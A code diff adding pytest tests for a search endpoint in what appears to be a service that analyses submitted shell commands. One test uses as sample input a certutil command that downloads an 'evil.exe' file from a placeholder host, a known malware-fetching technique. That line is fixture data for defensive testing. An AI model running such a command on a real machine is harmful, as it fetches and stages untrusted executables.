@@ -173,3 +173,31 @@ async def test_get_analysis_after_post(client):
     resp = await client.get(f"/c/{slug}")
     assert resp.status_code == 200
     assert resp.json()["slug"] == slug
+
+
+# ---------------------------------------------------------------------------
+# Search
+# ---------------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_search_returns_matching_command(client):
+    await post_analyze(client, "certutil -urlcache -split -f http://example.com/evil.exe")
+    resp = await client.get("/search?q=certutil")
+    assert resp.status_code == 200
+    results = resp.json()
+    assert isinstance(results, list)
+    assert any("certutil" in r["command"].lower() for r in results)
+
+
+@pytest.mark.asyncio
+async def test_search_query_too_short(client):
+    resp = await client.get("/search?q=x")
+    assert resp.status_code == 400
+    assert resp.json()["detail"]["code"] == "query_too_short"
+
+
+@pytest.mark.asyncio
+async def test_search_no_results_for_unsubmitted_term(client):
+    resp = await client.get("/search?q=xyzzy12345notreal")
+    assert resp.status_code == 200
+    assert resp.json() == []
